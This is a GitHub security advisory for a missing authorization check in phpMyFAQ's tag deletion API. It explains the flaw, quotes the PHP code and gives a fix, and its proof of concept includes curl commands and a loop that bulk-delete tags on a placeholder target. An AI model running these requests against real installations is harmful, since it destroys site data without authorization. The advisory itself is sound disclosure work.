# [M] phpMyFAQ's Missing Authorization on Tag Deletion Allows Any Authenticated User to Delete Tags

## Summary
Severity: Medium
Advisory: GHSA-7cx3-2qx2-3g6w
CWE: CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-7cx3-2qx2-3g6w
Type: github-advisory

## Affected
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.1.2
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.1.2

## Details
## Summary

The `TagController::delete()` endpoint at `DELETE /admin/api/content/tags/{tagId}` only verifies that the user is logged in (`userIsAuthenticated()`), but does not check any permission. Any authenticated user — including regular non-admin frontend users — can delete any tag by ID. This contrasts with `TagController::update()` and `TagController::search()`, which both enforce the `FAQ_EDIT` permission.

## Details

In `phpmyfaq/src/phpMyFAQ/Controller/Administration/Api/TagController.php`, the `delete()` method (line 121-133) uses only `$this->userIsAuthenticated()`:

```php
#[Route(path: 'content/tags/{tagId}', name: 'admin.api.content.tags.id', methods: ['DELETE'])]
public function delete(Request $request): JsonResponse
{
    $this->userIsAuthenticated();  // Only checks isLoggedIn() — no permission check

    $tagId = (int) Filter::filterVar($request->attributes->get('tagId'), FILTER_VALIDATE_INT);

    if ($this->tags->delete($tagId)) {
        return $this->json(['success' => Translation::get(key: 'ad_tag_delete_success')], Response::HTTP_OK);
    }

    return $this->json(['error' => Translation::get(key: 'ad_tag_delete_error')], Response::HTTP_BAD_REQUEST);
}
```

Compare with `update()` (line 48-71) which properly enforces authorization:

```php
public function update(Request $request): JsonResponse
{
    $this->userHasPermission(PermissionType::FAQ_EDIT);  // Proper permission check
    // ... also verifies CSRF token ...
}
```

The `userIsAuthenticated()` method in `AbstractController` (line 258-263) only checks `$this->currentUser->isLoggedIn()`:

```php
protected function userIsAuthenticated(): void
{
    if (!$this->currentUser->isLoggedIn()) {
        throw new UnauthorizedHttpException(challenge: 'User is not authenticated.');
    }
}
```

There is no admin-level middleware in the `Kernel` — it registers only RouterListener, LanguageListener, ControllerContainerListener, and exception listeners. The admin API entry point (`admin/api/index.php`) shares the same bootstrap and session as the frontend, meaning a frontend user's session cookie is valid for admin API requests.

Additionally, this endpoint lacks CSRF token verification (unlike `update()`), though the primary issue is the missing authorization since the attack vector is a logged-in user acting directly.

## PoC

```bash
# Step 1: Register as a regular user on the phpMyFAQ frontend
# (or use any existing non-admin authenticated session)

# Step 2: As the authenticated non-admin user, delete tag with ID 1:
curl -X DELETE 'https://target.com/admin/api/content/tags/1' \
  -H 'Cookie: PHPSESSID=<regular_user_session>'

# Expected: 401 or 403 (user lacks FAQ_EDIT permission)
# Actual: 200 OK with {"success": "..."}

# Step 3: Enumerate and delete all tags:
for i in $(seq 1 100); do
  curl -s -X DELETE "https://target.com/admin/api/content/tags/$i" \
    -H 'Cookie: PHPSESSID=<regular_user_session>'
done
```

## Impact

Any authenticated user (including regular frontend users who registered through the public registration form) can delete all tags in the phpMyFAQ instance. This results in:

- **Data integrity loss:** Tags are permanently deleted from the database. All FAQ-to-tag associations are destroyed.
- **Disruption of FAQ organization:** Tag-based navigation, filtering, and tag clouds become empty or broken.
- **No recoverability without backup:** Deleted tags and their associations cannot be restored without a database backup.

The impact is limited to tags (not FAQ content itself), but in large installations with extensive tag taxonomies, this could significantly degrade usability.

## Recommended Fix

Add the `FAQ_EDIT` permission check and CSRF token verification to `TagController::delete()`, consistent with `TagController::update()`:

```php
#[Route(path: 'content/tags/{tagId}', name: 'admin.api.content.tags.id', methods: ['DELETE'])]
public function delete(Request $request): JsonResponse
{
    $this->userHasPermission(PermissionType::FAQ_EDIT);

    $tagId = (int) Filter::filterVar($request->attributes->get('tagId'), FILTER_VALIDATE_INT);

    if ($this->tags->delete($tagId)) {
        return $this->json(['success' => Translation::get(key: 'ad_tag_delete_success')], Response::HTTP_OK);
    }

    return $this->json(['error' => Translation::get(key: 'ad_tag_delete_error')], Response::HTTP_BAD_REQUEST);
}
```

At minimum, add `$this->userHasPermission(PermissionType::FAQ_EDIT)` to enforce the same authorization as the update and search endpoints. Consider also adding a dedicated `TAG_DELETE` permission type for more granular access control.

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-7cx3-2qx2-3g6w
- https://github.com/thorsten/phpMyFAQ
